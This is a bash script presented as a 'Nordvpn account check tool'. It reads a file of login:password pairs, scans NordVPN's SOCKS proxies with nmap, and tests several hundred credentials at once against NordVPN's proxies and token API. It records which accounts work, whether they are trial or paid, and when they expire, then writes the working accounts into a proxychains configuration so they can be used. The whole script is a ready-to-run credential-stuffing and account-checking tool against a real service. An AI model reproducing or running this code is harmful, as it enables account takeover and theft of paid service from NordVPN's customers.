#Nordvpn account check tool Created by matrix
#
#Run like bash chk2.sh filename.txt filename.txt must be in login:password format 
#Working proxy accounts will be stored into work.txt Multithreaded tool. default 190 threads, you can change inside.
ver=2.1
fn=$1
out="work.txt"
t=`wc -l $fn`
threads=500
tmo=15
slp=7
ct=0
cct=0

if [[ $# -eq 0 ]] ; then
    echo "Nordvpn check tool ver. $ver"
    echo 'Created by matrix'
    echo 'Run like bash chk2.sh filename.txt'
    echo 'filename.txt must be in login:password format'
    echo "Working proxy accounts will be stored into $out and ${out}_accounts"
    exit 0
fi

echo "Nordvpn check tool ver. $ver"
echo 'Created by matrix'
echo "Working proxy accounts will be stored into $out and ${out}_accounts"
rm -f proxychains.conf
sleep 1 


echo Getting proxy list
if [ "$(( $(date +"%s") - $(stat -c "%Y" /tmp/tm1) ))" -gt "7200" ]; then
   echo "/tmp/tm1 (proxy file of nordvpn) is older then 2 hours"
   curl -i -s https://nordvpn.com/ru/ovpn/ |grep '<span class="mr-2">'|cut -d\> -f2|cut -d\< -f1|shuf -n 150 >/tmp/tm0
   echo Check with nmap open ports
   nmap -Pn -n --open --min-rate 1000 -p1080 -iL /tmp/tm0|grep "report for"|awk '{print $5}'>/tmp/tm1;echo Proxy list is count `wc -l /tmp/tm1` of `wc -l /tmp/tm0`;cat /tmp/tm1
   echo _________________________________
   echo Starting total for checking $t
   echo _________________________________
   cat $fn|tr -d "\r" >$fn.tmp; mv $fn.tmp $fn
else
  echo "/tmp/tm1 (proxy file of nordvpn) is not older then 2 hours, skipping update"
  sleep 1
fi
pr=`shuf -n 1 /tmp/tm1`

while read p; do
  cct=$((cct+1))
  pr=`shuf -n 1 /tmp/tm1`
#  ct=`ps|grep curl|wc -l`
  ct=$((ct+1))
  if [ "$ct" -ge "$threads" ]; then 
  echo Working $cct / $t
  while [ true ]; do
    if [ `ps|grep curl|wc -l` -ge "$threads"  ]; then
      echo We sleep $slp sec. Current proc running `ps|grep curl|wc -l` Limit : $threads
      echo Working $cct / $t
      sleep $slp
      ct=`ps|grep curl|wc -l`
    else
      ct=`ps|grep curl|wc -l`
      #echo We continue, current load  $ct of $threads
      break
    fi
  done
  fi
  set -- "$p" 
  IFS=":"; declare -a Array=($*)  
  
  (curl --retry 2 --retry-delay 1 --retry-max-time 5 --connect-timeout $tmo -m $tmo -sf -U ${Array[0]}:${Array[1]} --socks5 $pr:1080 2ip.ru >/dev/null && (echo +Valid:"${Array[0]}:${Array[1]}" && echo "${Array[0]}:${Array[1]}"  >>$out) )&
done < $fn


while [ true ]; do
  if [ `ps|grep curl|wc -l` -ge 1  ]
  then 
    echo We sleep $slp sec. Current proc running `ps|grep curl|wc -l` Limit : $threads && sleep $slp
  else
    echo We continue, Current proc running `ps|grep curl|wc -l`
    sleep $slp
    cp work.txt work_all.txt
    cat work_all.txt|sort|uniq >work.txt
    echo total work:`wc -l work_all.txt` clean:`wc -l work.txt`
    echo "Starting getting info about accounts ..."

    while read z; do
        (set -- "$z" 
        IFS=":"; declare -a Array=($*)  
	s=$(proxychains curl -s --header "Content-Type: application/json"  --request POST   --data "{\"username\": \"${Array[0]}\", \"password\": \"${Array[1]}\"}"  https://api.nordvpn.com/v1/users/tokens)
        ([[ $s =~ "Unauthorized" ]] && [[ $s =~ "Invalid username" ]]) || (t=$(echo $s| awk -F "\"" '{print $6}'|tr -d "\n")
        printf "\nchecking ${Array[0]}:${Array[1]}:token=$t"
        user_json=$(proxychains curl --connect-timeout $tmo -m $tmo --retry 2 --retry-delay 1 --retry-max-time 5 --silent -X GET --header "nToken: $t" --header "Accept: application/json" https://api.nordvpn.com/user/databytoken)
        if [ "${user_json}" != "" ]; then 
          user_trial="$(echo $user_json |awk -F" " '{print $2}'|awk -F "," '{print $1}')"
          user_expires="$(echo $user_json| awk -F" " '{print $3}'|awk -F "," '{print $1}')"
          if [ -n "${user_trial}" ]; then
            case "${user_trial}" in
              "true")  ac=" account_type:trial "   ;;
              "false") ac=" account_type:paid/"    ;;
              *)       ac=" account_type:unknown " ;;
            esac
          fi
          if [ -n "${user_expires}" ]; then
	    exp=$(LC_ALL=C date -d "+${user_expires} secs")
            exp_date=$(date -d "${exp}" '+%Y/%m')
            echo "${Array[0]}:${Array[1]}$ac$exp_date"
            echo "${Array[0]}:${Array[1]}$ac$exp_date" >> ${out}_accounts

          fi
        else
          echo "Error connecting to NordVPN service using token"
        fi
        ))&
#	break
    done < work.txt
	while [ true ]; do
          if [ `ps|grep curl|wc -l` -ge 1  ]
	  then 
	    echo We sleep $slp sec. Current proc running `ps|grep curl|wc -l` Limit : $threads && sleep $slp
	  else
	    echo We continue, Current proc running `ps|grep curl|wc -l`
	    sleep $slp
	    cp ${out}_accounts ${out}_accounts.tmp
	    cat ${out}_accounts.tmp|sort|uniq >${out}_accounts
	    rm -f ${out}_accounts.tmp
            cat ${out}_accounts|awk -F " " '{print $1}' >${out}_accounts_work
	    dd=`grep -n meanwile /etc/proxychains.conf|awk -F":" '{print $1}'`
	    head -$dd -q  /etc/proxychains.conf >p
	    rm /tmp/tmip -f
	    rm pro.conf -f
	    echo Generating proxychains list
	    echo "Resolving proxy list ip's"
#	    curl --silent "https://api.nordvpn.com/v1/servers/recommendations" | jq --raw-output 'limit(100;.[]) | .hostname' >/tmp/tm0
#	    echo Check with nmap open ports
#	    nmap -Pn -n --open -p1080 -iL /tmp/tm0|grep "report for"|awk '{print $5}'>/tmp/tm1;echo Proxy list is count `wc -l /tmp/tm1` of `wc -l /tmp/tm0`;cat /tmp/tm1
	    while read h; do
	      host $h|cut -d " " -f4- >>/tmp/tmip
	    done </tmp/tm1
	    while read z; do
	      pr=`shuf -n 1 /tmp/tmip`
	      set -- "$z" 
              IFS=":"; declare -a Array=($*)  
              echo -e "socks5 $pr 1080 ${Array[0]} ${Array[1]}"
              echo -e "socks5 $pr 1080 ${Array[0]} ${Array[1]}" >>pro.conf
            done <${out}_accounts_work
	    cat p >proxychains.conf
	    cat pro.conf >>proxychains.conf
	    break
	  fi
	done
    break
  fi
done
